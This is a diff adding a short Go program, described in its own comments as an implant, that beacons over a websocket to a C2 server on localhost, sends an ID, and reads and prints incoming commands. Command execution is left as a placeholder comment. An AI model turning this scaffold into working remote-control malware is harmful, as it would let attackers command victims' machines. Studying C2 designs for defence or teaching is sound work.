@@ -1,0 +1,42 @@
+package main
+
+import (
+    "fmt"
+    "log"
+    "time"
+    "github.com/gorilla/websocket"
+)
+
+// Implant configuration
+const c2Address = "ws://localhost:8080/ws"
+const implantID = "implant-1234"
+
+// Connects to C2 server and listens for commands
+func connectToC2() {
+    conn, _, err := websocket.DefaultDialer.Dial(c2Address, nil)
+    if err != nil {
+        log.Fatal("Connection error:", err)
+    }
+    defer conn.Close()
+
+    // Send implant ID to C2
+    conn.WriteMessage(websocket.TextMessage, []byte(implantID))
+
+    // Listen for commands
+    for {
+        _, message, err := conn.ReadMessage()
+        if err != nil {
+            log.Println("Read error:", err)
+            return
+        }
+        fmt.Printf("Received command: %s\n", string(message))
+        // Execute command (simplified example)
+    }
+}
+
+func main() {
+    for {
+        connectToC2()
+        time.Sleep(10 * time.Second)
+    }
+}
